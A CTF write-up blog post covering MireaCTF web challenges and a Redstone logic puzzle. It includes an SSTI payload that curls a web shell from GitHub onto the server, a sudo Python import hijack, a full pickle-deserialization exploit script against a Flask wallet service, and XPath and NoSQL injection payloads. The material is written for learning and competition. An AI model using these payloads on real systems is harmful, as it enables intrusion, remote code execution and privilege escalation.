# Info

This was a fun and quick CTF with easy to medium difficulty challenges. It was on 1st of Mai and ran only for 8 hours.
I concentrated mostly on web challenges and tried to score a firstblood in the end on a misc challenge, which I only solved
30 minutes after the deadline.

I played again with the World Wide Flags team and we came in 3rd place. (3/106 = 2.8%)

## Writeups

### Web

#### Crazypickles

This was a blackbox web challenge.
We are greeted by a simple form. Providing card-details, we can see that the card number is reflected on the next page.
So we try to do SSTI and are actually successful with the payload `{{10*2}}` (We are greeted by `20`).

In order to exploit this, we upload a shell with the payload `{{['curl+https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php+>+shell.php']|filter('system')}}` (props to @Kli)

Once we are in, `sudo -l` shows us, that we have sudo rights to run some python script. It doesn't look vulnerable at first glance, but then we see that
we import libraries (`import re`).
We can thus simply `cat` the flag file by hijacking this import:

`echo "def find_all(): import os; os.system('cat /root/flag.txt')" > re.py`

And now, when we run the main script with sudo, it will import re and call find_all, so root will cat the flag for us. Thanks root!

#### Cryptopro

Next up was cryptopro, a whitebox web challenge. It contains a Flask server. The main point of interest is here:

```
@app.route('/load', methods=['POST', 'GET'])
def load():
    try:
        uploaded_file = request.files['file']
        if uploaded_file.filename != '':
            uploaded_file.save('wallet.bin')
            with open('wallet.bin', 'rb') as f:
                data = f.read()

                encrypt_key_bytes = encrypt_key.encode('utf-8')

                tmp = b""
                for i in range(len(data)):
                    tmp += bytes([data[i] ^ encrypt_key_bytes[i %
                                    len(encrypt_key_bytes)]])
                balance_data = tmp[:-1]
                decrypted_secret_number_index = tmp[-1:]
                decrypted_secret_number = int.from_bytes(decrypted_secret_number_index, byteorder='big')

                if decrypted_secret_number != secret_number:
                    return render_template('index.html', error='The wallet is not signed by our service!')

                print("Result of balance.load: ")
                balance.load(balance_data)
    except Exception as e:
        return render_template('index.html', error=f'Something went wrong')

    return redirect(url_for('index'))
```

So whenever we upload a file, the first part up to the last byte is used as data and the last byte is used to check against a secret_number.
This secret number is between 10 and 99 so it is trivially bruteforced. The whole file is xored against a secret_key which is not so secret
in a whitebox challenge.  

```
class Wallet:
    def __init__(self):
        self.count = 0

    def load(self, data):
        self.__dict__ = pickle.loads(data)
        print(self.__dict__)

    def save(self):
        res = pickle.dumps(self.__dict__, 1)
        return res
```

A second interesting part is the Wallet class. It loads and dumps itself using pickle, which will be useful shortly.
Finally the save functionality again checks the last byte against the secret_number and calls `save` on the Wallet object.
Apart from that, it also sends us back the wallet file.

```
@app.route('/save', methods=['POST', 'GET'])
def save():
    print("Result of balance.save():")
    balance.save()
    data = balance.save()
    data = data + int(secret_number).to_bytes(1, 'big')

    print(f"Will send back: {data}")

    encrypt_key_bytes = encrypt_key.encode('utf-8')
    tmp = b""
    for i in range(len(data)):
        tmp += bytes([data[i] ^ encrypt_key_bytes[i % len(encrypt_key_bytes)]])
    data = tmp


    with open('wallet.bin', 'wb') as f:
        f.write(data)
    return send_file('wallet.bin', as_attachment=True)
```


The following was the exploit I finally came up with:


```
import requests
from tqdm import tqdm
import pickle
import os
from urllib.request import urlretrieve

from app import Wallet

secret_key = ""
encrypt_key = 'uiweiudwnhefiuwehfiuwefniwuefniuwefnwiuweojfoiwjefijwoifjwoifjowjfoiwjfijewfoijweoifjoiwjefojwfeiojwfoijwoifjwef'

def create_rce_file():

    rce = Wallet()

    rce.load = exec

    with open("rcefile.bin", "wb") as w:
        pickle.dump(rce.__dict__, w)

def third_stage(secret_number):
    encrypt_key_bytes = encrypt_key.encode('utf-8')
    param = b"import os; balance.count = os.environ['FLAG']"
    tmp = b""

    for i in range(len(param)):
        tmp += bytes([param[i] ^ encrypt_key_bytes[i % len(encrypt_key_bytes)]])

    tmp += bytes([secret_number ^ encrypt_key_bytes[(i + 1) % len(encrypt_key_bytes)]])

    with open("wallet.bin", "wb") as w:
        w.write(tmp)

def second_stage(secret_number):
    create_rce_file()
    encrypt_key_bytes = encrypt_key.encode('utf-8')

    with open("rcefile.bin", "rb") as r:
        dump = r.read()

    tmp = b""
    for i in range(len(dump)):
        tmp += bytes([dump[i] ^ encrypt_key_bytes[i % len(encrypt_key_bytes)]])

    tmp += bytes([secret_number ^ encrypt_key_bytes[(i + 1) % len(encrypt_key_bytes)]])

    with open("wallet.bin", "wb") as w:
        w.write(tmp)
    

def create_file_with_n_bytes(nbytes, lastbyte, previous):
    with open("wallet.bin", "wb") as w:        
        for i in range(nbytes - 1):
            w.write(b"0")
        w.write((lastbyte).to_bytes())


def upload_file(p=False):
    encrypt_key_bytes = encrypt_key.encode('utf-8')
    url = "http://5a98e89f-4ab2-4c27-8aab-d1b5e6893d81.spring.mireactf.ru"

    files = {'file': open("wallet.bin", "rb")}
    r = requests.post(url + "/load", files=files)

    try:
        if not "The wallet is not signed" in r.text:
            r = urlretrieve(url + "/save", "file.bin")
            tmp = b""
            with open("file.bin", "rb") as dlfile:
                dump = dlfile.read()
                for i in range(len(dump)):
                    tmp += bytes([dump[i] ^ encrypt_key_bytes[i % len(encrypt_key_bytes)]])

            print(tmp)

            print(r)
            return True
    except Exception as e:
        print(e)
        print("Was correct but can't download file...")
        return True

    if (p):
        print(r.text)

    return False

previous = 0
secret_number = 0

from time import sleep

# secret_number = 29

if secret_number == 0:
    for i in tqdm(range(256)):
        sleep(0.5)
        create_file_with_n_bytes(1, i, previous)
        result = upload_file()
        if result:
            print(f"Secret number is: {i ^ ord('u')}")
            secret_number = i ^ ord('u')
            break

second_stage(secret_number)
result = upload_file(True)

third_stage(secret_number)
result = upload_file(True)
```

It consists of three stages. The first stage looks for the secret_number. Iterating through all
the values from 0 to 255 as the last byte of an uploaded file, it checks the response it gets from the server.
When the response is friendly, we simply XOR the byte we found with the first byte of the key and thusly receive the
secret_number.

The second stage pickles a Wallet object. It overwrites the `load` function with the `exec` function. If we `POST` to
`/load` with this file, the original `load` function from the Wallet object gets overwritten with `exec`.

The third and final stage brings it all together. Instead of putting a pickleable object in the file we uplod, we now put
the parameter we want to pass to `exec`, which is `b"import os; balance.count = os.environ['FLAG']"`. The server calls `load`
on the `balance` object, which now is `exec` with the payload we just upload and sets the `balance.count` to the flag.

After this, we can simply login and see the flag to be the balance count in the upper right.


#### PathToLibrary

This was another blackbox web challenge, which was solved in good teamwork.

@Kli found the `/secret` path which showed the XML structure of the documents on the website.
So the team came up with idea of XXE and we all went ham on the endpoints.
We got an error indicating unallowed XPath queries, so we came up with the idea of XPath injection.

Trying out different things from hacktricks, we put in `/books/book[count(/*[1]/*)]`, which simply retrieved the flag.
That went quicker than it could have.


#### CVE Hunter

This was another blackbox web challenge, which we also solved as a team.

We found that we needed some kind of code to access hidden information. After that, we then found the secret encoding key by using `flask-unsign` to bruteforce the session token.
Using this, we could log in as admin. However, admin had 2FA setup which we needed to circumvent. We found that it was probably vulnerable to NoSQL injection. The payload
that did the trick was `secretPassword=1234'+||+1%3d%3d1+||+'`.

So we got the secret key which gave us direct access to the flag.

### Misc

#### Low-Level

Unfortunately I didn't solve this in time and only solved it 30 minutes after the deadline. However it was a fun experience as I first had no clue at all what this was supposed to be
(although I did have some Redstone knowledge).

I found that the different pixels of the image board were driven by OR-lines coming from some kind of processor. The pixels would display the currently active OR-line.
A 3 octal-digit pin-code had to be setup so that the correct output was shown. I noted down the memory content (simulated some kind of contraption that pushed glass (0) and stone (1) in circles).
I investigated which numbers the letters on the image-board corresponded to and noted down which ones I wanted to see (`mireactf{`). Then I investigated how the pin-code was connected to the `RAM`.
During the CTF I thought they were connected through a NAND-gate, which is why I wasn't able to solve it in time. Only after the CTF did I see that they were actually XOR gates, which made it a lot
easier. I looked for a pattern including 5 codes starting with a 1, followed by 2 starting with a 0 (Because this was dictated by `mireactf{`). When I was confident I found the correct start point (this was
necessary because the RAM was rotating and there was no clear start), I simply XORed the desired output with the input (RAM value) to get the key.

After that, it was just a matter of XORing all the RAM values with the key to get the flag. This is the code I wrote for that:

```
values = ["d","4","a","_","r","s","3","i","'","0","m","f","}","e","n","h","5","t","{","c"]

entries = ["10111","11010","11001","10000","11111","01110","01100","10110","01111","01100","10010","11100","01100","10101","11000","11110","11001","11011","11101","01101","01100","10100","10011","11011","11110","10111","11100","11101","10011","11011","11000","01101","10001"]

key = "11101"

for entry in entries:
    i = 0
    value = 0
    for e,k in zip(entry, key):
        x = int(e) ^ int(k)
        if x == 1:
            value += 1 << (4-i)
        i += 1

    print(values[value], end="")
```


Overall, this was a fun experience and I am looking forward to the next one!